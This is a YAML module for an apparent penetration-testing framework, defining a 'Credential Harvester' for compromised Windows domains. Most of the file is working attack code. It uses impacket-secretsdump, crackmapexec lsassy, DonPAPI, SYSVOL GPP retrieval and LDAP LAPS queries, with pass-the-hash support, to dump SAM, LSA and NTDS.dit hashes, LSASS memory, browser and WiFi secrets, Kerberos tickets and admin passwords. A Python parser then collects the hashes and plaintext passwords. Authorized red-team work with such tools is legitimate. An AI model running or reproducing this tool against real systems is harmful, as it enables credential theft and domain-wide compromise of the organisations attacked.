# Credential Harvester - Multi-Protocol Credential Extraction
# Enterprise Tier Module - Requires valid Raven Enterprise license
name: "Credential Harvester"
description: |
  Advanced multi-protocol credential extraction for post-compromise scenarios:
  - SAM/LSA secrets extraction (local admin required)
  - NTDS.dit extraction (domain admin required)
  - LSASS memory dump and parsing
  - Cached domain credentials
  - DPAPI secrets (Chrome, Edge, WiFi passwords)
  - Vault credentials
  - Kerberos tickets (TGT/TGS)
  - Service account credentials
  - Scheduled task credentials
  - Registry stored credentials
  - Group Policy Preferences (GPP) passwords
  - LAPS passwords
version: "2.0.0"
author: "Raven Team"
tool: secretsdump
category: internal
tier: team

tags:
  - credentials
  - post-exploitation
  - lateral-movement
  - privilege-escalation
  - enterprise

inputs:
  - name: target
    type: string
    required: true
    description: "Target hostname or IP"

  - name: username
    type: string
    required: true
    description: "Username with admin privileges"

  - name: password
    type: string
    default: ""
    description: "Password for authentication"

  - name: hash
    type: string
    default: ""
    description: "NTLM hash for pass-the-hash"

  - name: domain
    type: string
    default: ""
    description: "Domain for authentication"

  - name: mode
    type: choice
    default: "full"
    choices: ["full", "sam", "lsa", "ntds", "lsass", "dpapi", "tickets", "gpp"]
    description: "Credential extraction mode"

  - name: exec_method
    type: choice
    default: "smbexec"
    choices: ["smbexec", "wmiexec", "psexec", "atexec"]
    description: "Remote execution method"

  - name: just_dc
    type: boolean
    default: false
    description: "NTDS.dit only - don't extract local accounts"

  - name: just_dc_ntlm
    type: boolean
    default: false
    description: "Only NTLM hashes from NTDS.dit"

command: |
  # Build auth string for impacket
  {% if password %}
  AUTH="{{domain}}/{{username}}:'{{password}}'@{{target}}"
  {% elif hash %}
  AUTH="{{domain}}/{{username}}@{{target}} -hashes '{{hash}}'"
  {% endif %}

  echo "[*] Credential Harvester starting against {{target}}";
  echo "[!] WARNING: This module extracts credentials - ensure proper authorization";

  {% if mode == 'sam' or mode == 'full' %}
  # Extract SAM database (local accounts)
  echo "[*] Extracting SAM database";
  impacket-secretsdump $AUTH -sam 2>/dev/null | tee {{output_file}}_sam.txt;
  {% endif %}

  {% if mode == 'lsa' or mode == 'full' %}
  # Extract LSA secrets
  echo "[*] Extracting LSA secrets";
  impacket-secretsdump $AUTH -lsa 2>/dev/null | tee {{output_file}}_lsa.txt;
  {% endif %}

  {% if mode == 'ntds' or mode == 'full' %}
  # Extract NTDS.dit (requires DA on DC)
  echo "[*] Extracting NTDS.dit (Domain Controller only)";
  impacket-secretsdump $AUTH {% if just_dc %}-just-dc{% endif %} {% if just_dc_ntlm %}-just-dc-ntlm{% endif %} 2>/dev/null | tee {{output_file}}_ntds.txt;
  {% endif %}

  {% if mode == 'lsass' or mode == 'full' %}
  # LSASS dump using various methods
  echo "[*] Dumping LSASS memory";

  # Method 1: Using crackmapexec
  crackmapexec smb {{target}} -u {{username}} {% if password %}-p '{{password}}'{% elif hash %}-H '{{hash}}'{% endif %} {% if domain %}-d {{domain}}{% endif %} -M lsassy 2>/dev/null | tee {{output_file}}_lsass.txt;

  # Method 2: procdump via impacket
  echo "[*] Attempting procdump method";
  # This requires procdump to be uploaded
  {% endif %}

  {% if mode == 'dpapi' or mode == 'full' %}
  # DPAPI secrets (Chrome, WiFi, etc.)
  echo "[*] Extracting DPAPI secrets";

  # Using DonPAPI if available
  if command -v DonPAPI &> /dev/null; then
    DonPAPI $AUTH -o {{output_file}}_dpapi/ 2>/dev/null;
  else
    # Fallback to manual DPAPI
    impacket-dpapi unprotect -dc-ip {{target}} $AUTH 2>/dev/null | tee {{output_file}}_dpapi.txt;
  fi
  {% endif %}

  {% if mode == 'tickets' or mode == 'full' %}
  # Kerberos tickets
  echo "[*] Extracting Kerberos tickets";

  # Export tickets via secretsdump
  impacket-secretsdump $AUTH -k 2>/dev/null | tee {{output_file}}_tickets.txt;

  # Get TGT for current user
  impacket-getTGT {{domain}}/{{username}}{% if password %}:'{{password}}'{% endif %} 2>/dev/null | tee -a {{output_file}}_tickets.txt;
  {% endif %}

  {% if mode == 'gpp' or mode == 'full' %}
  # Group Policy Preferences passwords
  echo "[*] Searching for GPP passwords";

  # Using crackmapexec gpp_password module
  crackmapexec smb {{target}} -u {{username}} {% if password %}-p '{{password}}'{% elif hash %}-H '{{hash}}'{% endif %} {% if domain %}-d {{domain}}{% endif %} -M gpp_password 2>/dev/null | tee {{output_file}}_gpp.txt;

  # Manual GPP search on SYSVOL
  smbclient //{{target}}/SYSVOL -U {{domain}}/{{username}}%{% if password %}{{password}}{% endif %} -c 'recurse ON; prompt OFF; mget *Groups.xml' 2>/dev/null;
  if [ -f Groups.xml ]; then
    cat Groups.xml | tee -a {{output_file}}_gpp.txt;
  fi
  {% endif %}

  # LAPS passwords if accessible
  echo "[*] Checking LAPS passwords";
  ldapsearch -x -H ldap://{{target}} -D "{{username}}@{{domain}}" {% if password %}-w '{{password}}'{% endif %} -b "DC=$(echo {{domain}} | sed 's/\./,DC=/g')" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd 2>/dev/null | tee {{output_file}}_laps.txt;

  # Combine and parse results
  python3 -c "
  import json, os, glob, re
  results = {'credentials': [], 'hashes': [], 'tickets': [], 'findings': []}

  # Parse secretsdump output
  for f in glob.glob('{{output_file}}_*.txt'):
      if not os.path.exists(f):
          continue
      with open(f) as fp:
          content = fp.read()

      # Extract NTLM hashes (user:rid:lm:nt:::)
      for match in re.finditer(r'^(\S+):(\d+):([a-f0-9]{32}):([a-f0-9]{32})', content, re.MULTILINE):
          results['hashes'].append({
              'user': match.group(1),
              'rid': match.group(2),
              'lm_hash': match.group(3),
              'nt_hash': match.group(4),
              'source': os.path.basename(f)
          })

      # Extract plaintext passwords
      for match in re.finditer(r'^(\S+):(\S+):(.+)$', content, re.MULTILINE):
          if ':aes' not in match.group(0) and ':::' not in match.group(0):
              results['credentials'].append({
                  'user': match.group(1),
                  'password': match.group(3),
                  'source': os.path.basename(f)
              })

      # LSA secrets
      if 'DPAPI_SYSTEM' in content or '\$MACHINE' in content:
          results['findings'].append({
              'type': 'lsa_secrets',
              'severity': 'critical',
              'description': 'LSA secrets extracted - may contain service account credentials'
          })

      # LAPS
      if 'ms-Mcs-AdmPwd' in content:
          for match in re.finditer(r'ms-Mcs-AdmPwd:\s*(\S+)', content):
              results['credentials'].append({
                  'user': 'LAPS_Admin',
                  'password': match.group(1),
                  'source': 'LAPS'
              })

  # Summary
  results['summary'] = {
      'total_hashes': len(results['hashes']),
      'total_credentials': len(results['credentials']),
      'total_tickets': len(results['tickets'])
  }

  if results['hashes']:
      results['findings'].append({
          'type': 'hashes_extracted',
          'severity': 'critical',
          'count': len(results['hashes']),
          'description': f'Extracted {len(results[\"hashes\"])} NTLM hashes'
      })

  if results['credentials']:
      results['findings'].append({
          'type': 'credentials_extracted',
          'severity': 'critical',
          'count': len(results['credentials']),
          'description': f'Extracted {len(results[\"credentials\"])} plaintext credentials'
      })

  with open('{{output_file}}', 'w') as out:
      json.dump(results, out, indent=2)
  "

output:
  format: json
  file: "creds_{{target|safe_filename}}.json"

parser:
  type: json_path
  results_path: "$.findings[*]"

findings_mapping:
  enabled: true
  title_template: "Credential Extraction: {{type}}"
  severity_field: "severity"
  severity_map:
    critical: "critical"
    high: "high"
  description_template: "{{description}}"
  evidence_template: "Extracted {{count}} items"
  affected_hosts_field: "target"
